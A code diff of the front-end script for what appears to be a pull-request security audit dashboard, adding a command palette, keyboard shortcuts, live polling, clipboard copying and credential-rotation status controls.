-        const urlEl = document.getElementById('webhook-url-display');
-        if (urlEl) urlEl.textContent = window.location.origin + '/webhook';
-        document.getElementById('connect-modal').classList.add('open');
+        const whUrl = window.location.origin + '/webhook';
+        $('#wh-url').textContent = whUrl;
+        $('#wh-copy').dataset.copy = whUrl;
+        $('#cn').showModal();
       }
 
-      function closeConnectModal() {
-        document.getElementById('connect-modal').classList.remove('open');
+      function buildPaletteItems() {
+        const query = ($('#pq').value || '').toLowerCase();
+        const actions = [
+          ...(state.playgroundEnabled ? [['Run demo audit', 'Playground', runDemoAudit]] : []),
+          ['Connect a repository', 'Setup', openConnectModal],
+          ['Copy fix prompt for selected audit', 'Selected audit', () => state.selId && openFixPrompt(state.selId, 'all')],
+          ['Check system health', 'Diagnostics', () => { renderHealthUI(); $('#hd').showModal(); }],
+          ['Show getting started', 'Help', () => { ls('sg-gs', '1'); renderGettingStarted(); }],
+          ['Filter: Needs review', 'Filter', () => { state.statusFilter = 'rev'; ls('sg-flt', 'rev'); renderList(); }],
+          ['Filter: All audits', 'Filter', () => { state.statusFilter = 'all'; ls('sg-flt', 'all'); renderList(); }],
+        ]
+          .filter(([title]) => title.toLowerCase().includes(query))
+          .map(([t, h, f]) => ({ t, h, f }));
+
+        const scans = state.scans
+          .filter((s) => `${s.repoFullName}#${s.prNumber} ${s.prTitle} ${s.headSha}`.toLowerCase().includes(query))
+          .map((s) => ({
+            t: `${s.repoFullName}#${s.prNumber} ${s.prTitle}`,
+            h: isPlaygroundScan(s) ? 'Demo' : (s.headSha || '').slice(0, 7),
+            f: () => {
+              state.selId = s.id;
+              state.tab = 'f';
+              renderAll();
+            },
+          }));
+
+        state.palItems = [...actions, ...scans].slice(0, 10);
+        state.palIdx = Math.min(state.palIdx, Math.max(state.palItems.length - 1, 0));
+        $('#pk').innerHTML =
+          state.palItems
+            .map(
+              (x, i) =>
+                `<li role="option" aria-selected="${i === state.palIdx}" data-pi="${i}"><span>${esc(x.t)}</span><small>${esc(x.h)}</small></li>`,
+            )
+            .join('') || `<li class="emp">No matches for “${esc($('#pq').value)}”.</li>`;
       }
 
-      document.getElementById('toggle-auto').addEventListener('click', () => {
-        state.auto = !state.auto;
-        setupRefresh();
-      });
-      document.getElementById('refresh-now').addEventListener('click', fetchScans);
-      document.getElementById('run-demo-btn').addEventListener('click', runDemo);
-      document.getElementById('custom-audit-form').addEventListener('submit', runCustomAudit);
-      document.querySelectorAll('button[data-sandbox-tab]').forEach((btn) => {
-        btn.addEventListener('click', () => switchSandboxTab(btn.getAttribute('data-sandbox-tab')));
-      });
-      document.querySelectorAll('button[data-preset]').forEach((btn) => {
-        btn.addEventListener('click', () => applyAttackPreset(btn.getAttribute('data-preset')));
-      });
-      document.getElementById('open-connect-btn').addEventListener('click', openConnectModal);
-      document.getElementById('close-connect-btn').addEventListener('click', closeConnectModal);
-      document.getElementById('connect-modal').addEventListener('click', (ev) => {
-        if (ev.target.id === 'connect-modal') closeConnectModal();
-      });
-      document.addEventListener('keydown', (ev) => {
-        if (ev.key === 'Escape') closeConnectModal();
-      });
-      document.getElementById('copy-webhook-url').addEventListener('click', (ev) => {
-        copyMarkdownText(window.location.origin + '/webhook', ev.currentTarget);
-      });
-      document.querySelectorAll('button[data-copy-cmd]').forEach((btn) => {
-        btn.addEventListener('click', () => copyMarkdownText(btn.getAttribute('data-copy-cmd'), btn));
-      });
-      applyAttackPreset('leaked-keys');
+      function openPalette() {
+        if (document.querySelector('dialog[open]:not(#pal)')) return;
+        $('#pq').value = '';
+        state.palIdx = 0;
+        buildPaletteItems();
+        $('#pal').showModal();
+        $('#pq').focus();
+      }
 
-      fetchScans();
-      setupRefresh();
+      function runPaletteItem(idx) {
+        const item = state.palItems[idx];
+        if (!item) return;
+        $('#pal').close();
+        item.f();
+      }
+
+      function setupPolling() {
+        clearInterval(state.pollTimer);
+        if (state.live) {
+          state.pollTimer = setInterval(() => refreshAll(false), 5000);
+        }
+        const b = $('#live');
+        b.setAttribute('aria-pressed', String(state.live));
+        b.classList.toggle('live', state.live);
+        b.querySelector('span').textContent = state.live ? 'Live' : 'Paused';
+        b.querySelector('.dot').style.background = state.live ? '' : 'var(--mu)';
+      }
+
+      document.addEventListener('click', async (e) => {
+        const t = e.target.closest(
+          '[data-id],[data-src],[data-f],[data-t],[data-copy],[data-ask],[data-rot],[data-fp],[data-open],[data-pi],[data-close],[data-pg-tab],[data-preset],#ap-btn,#rs-btn,#copy-md-btn,#copy-json-btn',
+        );
+        if (!t) return;
+
+        if (t.dataset.id) {
+          state.selId = t.dataset.id;
+          state.tab = 'f';
+          renderAll();
+          if (!state.detailsCache[state.selId]) fetchScanDetail(state.selId);
+          if (innerWidth <= 1000) {
+            $('#detail').scrollIntoView({
+              block: 'start',
+              behavior: matchMedia('(prefers-reduced-motion:reduce)').matches ? 'auto' : 'smooth',
+            });
+          }
+        } else if (t.dataset.src) {
+          state.sourceFilter = t.dataset.src;
+          ls('sg-src', state.sourceFilter);
+          renderAll();
+        } else if (t.dataset.f) {
+          state.statusFilter = t.dataset.f;
+          ls('sg-flt', state.statusFilter);
+          renderList();
+        } else if (t.dataset.t) {
+          state.tab = t.dataset.t;
+          if (state.tab === 'r' && state.selId && !state.detailsCache[state.selId]) {
+            fetchScanDetail(state.selId);
+          }
+          renderDetail();
+        } else if (t.hasAttribute('data-close')) {
+          t.closest('dialog').close();
+        } else if (t.dataset.fp) {
+          const [scanId, target] = t.dataset.fp.split('::');
+          openFixPrompt(scanId, target);
+        } else if (t.dataset.open === 'cn') {
+          openConnectModal();
+        } else if (t.dataset.open) {
+          $('#' + t.dataset.open).showModal();
+        } else if (t.dataset.pi !== undefined) {
+          runPaletteItem(Number(t.dataset.pi));
+        } else if (t.dataset.rot) {
+          const [key, nextSt] = t.dataset.rot.split('::');
+          const prev = state.credState[key];
+          state.credState[key] = nextSt;
+          state.credTime[key] = new Date().toLocaleString();
+          ls('sg-cred', JSON.stringify(state.credState));
+          state.openFindingKey = key;
+          renderAll();
+          undoToast(
+            nextSt === 'revoked'
+              ? 'Revocation reported. Not verified with the provider.'
+              : 'Rotation reported. Not verified with the provider.',
+            () => {
+              if (prev) state.credState[key] = prev;
+              else delete state.credState[key];
+              ls('sg-cred', JSON.stringify(state.credState));
+              renderAll();
+            },
+          );
+        } else if (t.dataset.ask) {
+          askQuestion(t.dataset.ask);
+        } else if (t.dataset.pgTab) {
+          state.pgTab = t.dataset.pgTab;
+          document.querySelectorAll('#pg-tabs button').forEach((b) => {
+            b.setAttribute('aria-pressed', String(b.dataset.pgTab === state.pgTab));
+          });
+          $('#pg-fixtures').hidden = state.pgTab !== 'fixtures';
+          $('#custom-form').hidden = state.pgTab !== 'custom';
+        } else if (t.dataset.preset) {
+          const p = ATTACK_PRESETS[t.dataset.preset];
+          if (p) {
+            $('#custom-title').value = p.title;
+            $('#custom-file').value = p.filename;
+            $('#custom-code').value = p.code;
+          }
+        } else if (t.id === 'ap-btn') {
+          promptApprove();
+        } else if (t.id === 'rs-btn') {
+          rescanSelected();
+        } else if (t.id === 'copy-md-btn') {
+          const d = selectedScan();
+          if (d && d.reportMarkdown) {
+            try {
+              await navigator.clipboard.writeText(d.reportMarkdown);
+              toast('Copied PR Markdown report');
+            } catch {
+              toast('Clipboard blocked', true);
+            }
+          }
+        } else if (t.id === 'copy-json-btn') {
+          const d = selectedScan();
+          const payload = d && (state.detailsCache[d.id] || { scan: d, patch: d.patch || null });
+          if (payload) {
+            try {
+              await navigator.clipboard.writeText(JSON.stringify(payload, null, 2));
+              toast('Copied Raw JSON');
+            } catch {
+              toast('Clipboard blocked', true);
+            }
+          }
+        } else if (t.dataset.copy) {
+          try {
+            await navigator.clipboard.writeText(t.dataset.copy);
+            toast('Copied');
+          } catch {
+            toast('Select text to copy', true);
+          }
+        }
+      });
+
+      document.addEventListener('submit', (e) => {
+        if (e.target.id === 'af') {
+          e.preventDefault();
+          const input = $('#qi');
+          const val = input ? input.value.trim() : '';
+          if (val) {
+            input.value = '';
+            input.removeAttribute('aria-invalid');
+            askQuestion(val);
+          } else if (input) {
+            input.setAttribute('aria-invalid', 'true');
+          }
+        }
+      });
+
+      document.addEventListener('input', (e) => {
+        if (e.target.id === 'qi') {
+          e.target.removeAttribute('aria-invalid');
+          const d = selectedScan();
+          if (d) state.qaDrafts[d.id] = e.target.value;
+        }
+      });
+
+      document.addEventListener(
+        'toggle',
+        (e) => {
+          const x = e.target;
+          if (x.matches && x.matches('details.f') && x.open) {
+            if (x.dataset.fkey) state.openFindingKey = x.dataset.fkey;
+            if (ls('sg-rev') !== '1') {
+              ls('sg-rev', '1');
+              renderGettingStarted();
+            }
+          }
+        },
+        true,
+      );
+
+      $('#q').addEventListener('input', (e) => {
+        state.searchQuery = e.target.value.toLowerCase();
+        renderList();
+      });
+      $('#scn').addEventListener('change', () => {
+        const val = $('#scn').value;
+        $('#fixture-desc').textContent =
+          val === 'clean'
+            ? 'Selected: Clean PR. No expected findings; verifies clean-path handling without touching connected repos.'
+            : 'Selected: Vulnerable PR. Simulated credential exposure, egress and a patch to approve. Demo runs never touch connected repositories.';
+      });
+      $('#demo-btn').addEventListener('click', runDemoAudit);
+      $('#custom-form').addEventListener('submit', runCustomAudit);
+      $('#url-form').addEventListener('submit', runPublicUrlAudit);
+      $('#gsx').addEventListener('click', () => {
+        ls('sg-gs', '0');
+        renderGettingStarted();
+        toast('Hidden. Reopen from ⌘K menu.');
+      });
+      $('#cbtn').addEventListener('click', openConnectModal);
+      $('#kbtn').addEventListener('click', openPalette);
+      $('#theme-btn').addEventListener('click', () => {
+        const cur = document.documentElement.getAttribute('data-theme') || 'dark';
+        applyTheme(cur === 'dark' ? 'light' : 'dark');
+      });
+      $('#live').addEventListener('click', () => {
+        state.live = !state.live;
+        setupPolling();
+      });
+      $('#hbtn').addEventListener('click', () => {
+        renderHealthUI();
+        $('#hd').showModal();
+        refreshAll(true);
+      });
+      $('#hchk').addEventListener('click', () => refreshAll(true));
+      $('#fpc').addEventListener('click', async () => {
+        const ta = $('#fpt');
+        try {
+          await navigator.clipboard.writeText(ta.value);
+          toast('Fix prompt copied');
+        } catch {
+          ta.select();
+          toast('Selected text — press Ctrl/⌘C');
+        }
+      });
+
+      $('#pq').addEventListener('input', () => {
+        state.palIdx = 0;
+        buildPaletteItems();
+      });
+      $('#pq').addEventListener('keydown', (e) => {
+        if (e.key === 'ArrowDown' || e.key === 'ArrowUp') {
+          e.preventDefault();
+          state.palIdx = Math.max(
+            0,
+            Math.min(state.palItems.length - 1, state.palIdx + (e.key === 'ArrowDown' ? 1 : -1)),
+          );
+          buildPaletteItems();
+        } else if (e.key === 'Enter') {
+          e.preventDefault();
+          runPaletteItem(state.palIdx);
+        }
+      });
+
+      document.addEventListener('keydown', (e) => {
+        if ((e.metaKey || e.ctrlKey) && e.key.toLowerCase() === 'k') {
+          e.preventDefault();
+          openPalette();
+          return;
+        }
+        if (e.metaKey || e.ctrlKey || e.altKey) return;
+        const tag = e.target.tagName;
+        if (e.key === 'Escape' && (tag === 'INPUT' || tag === 'TEXTAREA')) {
+          e.target.blur();
+          return;
+        }
+        if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT' || document.querySelector('dialog[open]')) {
+          return;
+        }
+        const vis = visibleScans();
+        const idx = vis.findIndex((s) => s.id === state.selId);
+        if (e.key === 'j' || e.key === 'k') {
+          const next = vis[Math.max(0, Math.min(vis.length - 1, idx + (e.key === 'j' ? 1 : -1)))];
+          if (next) {
+            state.selId = next.id;
+            state.tab = 'f';
+            renderAll();
+          }
+        } else if (e.key === 'a') {
+          promptApprove();
+        } else if (e.key === '/') {
+          e.preventDefault();
+          $('#qi')?.focus();
+        }
+      });
+
+      {
+        const p = ATTACK_PRESETS['leaked-keys'];
+        $('#custom-title').value = p.title;
+        $('#custom-file').value = p.filename;
+        $('#custom-code').value = p.code;
+      }
+
+      setupPolling();
+      refreshAll(true);
     </script>
   </body>
 </html>
